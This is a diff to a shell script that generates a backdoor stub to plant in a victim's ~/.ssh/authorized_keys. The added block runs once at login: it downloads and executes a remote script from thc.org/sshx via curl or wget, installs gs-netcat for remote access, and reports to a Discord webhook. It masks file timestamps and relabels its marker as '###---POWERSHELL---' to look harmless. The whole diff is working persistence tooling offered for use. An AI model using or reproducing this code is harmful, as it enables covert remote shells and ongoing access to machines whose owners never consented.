@@ -15,6 +15,30 @@ else
     out(){ :;}
 fi
 
+    # exec bash -c '{ [[ $(stat -c%Y /bin/sh) != $(stat -c%Y .ssh) ]] && { :
+    #     touch -r /bin/sh .ssh
+    #     ###-----BEGIN BACKDOOR-----
+    #     # Anything from here until -----END BACKDOOR----- will
+    #     # be executed once when the user logs in. All output goes
+    #     # to stderr.
+    #     #
+    #     # In our DEMO example we request a backdoor script
+    #     # from thc.org/sshx. PLEASE CHANGE THIS.
+    #     #
+    #     # Set a DISCORD KEY:
+    #     export KEY="%%KEY%%"
+    #     # Request and execute sshx (which will install gs-netcat and
+    #     # report the result back to our DISCORD channel)
+    #     bash -c "$(curl -fsSL thc.org/sshx)" || bash -c "$(wget --no-verbose -O- thc.org/sshx)" || exit 0
+    #     ###-----END BACKDOOR-----
+    # } >/dev/null 2>/dev/null & :
+    # [[ -n $SSH_ORIGINAL_COMMAND ]] && exec $SSH_ORIGINAL_COMMAND
+    # [[ -z $SHELL ]] && SHELL=/bin/bash
+    # [[ -f /run/motd.dynamic ]] && cat /run/motd.dynamic
+    # [[ -f /etc/motd ]] && cat /etc/motd
+    # exec -a -$(basename $SHELL) $SHELL; }'
+
+
 # This stub is encoded for the ssh-key 'command='.
 stubs(){ ###___STUBS___
     # - Check if /bin/sh and .ssh have the same date. We set it to the _same_ date
@@ -54,7 +78,7 @@ get_stubs()
 }
 
 get_stubs
-cmd=$(echo "$STUB" | sed 's/^[ \t]*//' | sed 's/^[ \t]*//' | sed '/^$/d' | sed '/^#/d' | tr '\n' ';' | sed "s|%%KEY%%|${KEY}|")
+cmd=$(echo "$STUB" | sed 's/^[[:blank:]]*//' | sed '/^$/d' | sed '/^#/d' | tr '\n' ';' | sed "s|%%KEY%%|${KEY}|")
 
 if [[ $1 == clear ]]; then
     cmd=${cmd//\"/\\\"}
@@ -71,5 +95,6 @@ Set your own DISCORD WEBHOOK KEY:
 
 out -e "${CDY}Prepend this to every line in ${CY}~/.ssh/authorized_keys${CDY}
 and ${CY}~/.ssh/id_rsa.pub${CDY} so that it looks like this${CN}:"
-echo -en "${CM}command=${CM}\"${CDM}\`###---AUTH-DO-NOT-REMOVE---\`;bash -c '{ ${cmd}}'${CM}\"${CN}"
-out " ssh-rsa blahblah..original..key..here"
+echo -en "${CM}no-user-rc,no-X11-forwarding,command=\"${CDM}\`###---POWERSHELL---\`;${cmd}${CM}\"${CN}"
+# echo -en "${CM}command=${CM}\"${CDM}\`###---POWERSHELL---\`;bash -c '{ ${cmd}}'${CM}\"${CN}"
+out " ssh-ed25519 AAAAC3Nzblah...."
